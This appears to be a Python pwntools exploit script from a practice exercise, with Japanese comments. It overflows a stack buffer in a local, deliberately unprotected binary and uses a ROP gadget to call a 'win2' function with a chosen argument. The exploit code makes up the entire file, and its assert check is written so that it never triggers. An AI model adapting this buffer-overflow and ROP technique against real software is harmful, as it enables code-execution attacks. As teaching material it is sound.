#!/usr/bin/env python3

# $ gcc sbof_ret.c -fno-stack-protector -no-pie -g -o sbof_ret
# $ stdbuf -o0 -e0 python3 ./sbof_ret.py --arg_idx <引数のindex番号>
# <引数のindex番号> 1:第一引数、2:第二引数、3:第三引数

from pwn import *
import sys
import struct
import argparse

bin_file = './sbof_ret'
binf = ELF(bin_file)
rop = ROP(binf)

def make_rop(arg_idx):
    rop_arg = []

    if arg_idx == 1:
        rop_arg = ['pop rdi', 'ret']
    elif arg_idx == 2:
        rop_arg = ['pop rsi', 'ret']
    elif arg_idx == 3:
        rop_arg = ['pop rdx', 'ret']
    else:
        assert(False, "[Assert] argument index range : 1 - 3")

    return rop_arg

def attack(conn, args, **kwargs):

    rop_gadget = rop.find_gadget(make_rop(args.arg_idx))
    print(f"Found pop rdi; ret at: {hex(rop_gadget.address)}")

    exploit =  b'a' * 0x10
    exploit += struct.pack('<Q', 0x00000000deadbeef)
    exploit += struct.pack('<Q', rop_gadget.address)
    exploit += struct.pack('<Q', 0x00000000cafebabe)
    exploit += struct.pack('<Q', binf.functions['win2'].address)

    conn.sendline(exploit)
    print(conn.recvall().decode())

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("--arg_idx", type=int, default=1)
    args = parser.parse_args()

    conn = process(bin_file)
    attack(conn, args)

if __name__=='__main__':
    main()
